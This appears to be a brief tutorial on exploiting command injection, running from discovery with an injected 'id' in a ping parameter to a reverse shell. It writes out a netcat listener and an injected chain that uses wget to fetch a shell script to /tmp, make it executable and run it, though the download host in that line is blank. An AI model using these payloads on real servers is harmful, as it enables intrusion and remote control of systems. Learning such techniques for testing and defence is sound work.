Exploiting Command Injection

From Discovery to Reverse Shell

Exploiting command injection typically follows a pattern: first, identify potential injection points by looking for OS-interacting features. Then, test these points with simple commands like `id` or `whoami`. Once confirmed, the goal is to establish a reverse shell. This involves using commands like `wget` or `curl` to download a payload from your machine to the target, while simultaneously running a listener (`netcat`) on your machine. Finally, inject a command to execute the payload, granting you interactive shell access to the compromised server.

Key Takeaway

Achieving a reverse shell is the ultimate goal of command injection exploitation, providing direct server control.

Discovery Example

Testing with `id`:

http://example.com/ping.php?ip=127.0.0.1%3Bid

If `id` output appears, command injection is confirmed.

Reverse Shell Steps

1. Set up listener: nc -lvnp 4444

2. Inject download & execute command (example):

127.0.0.1; wget http:///shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh
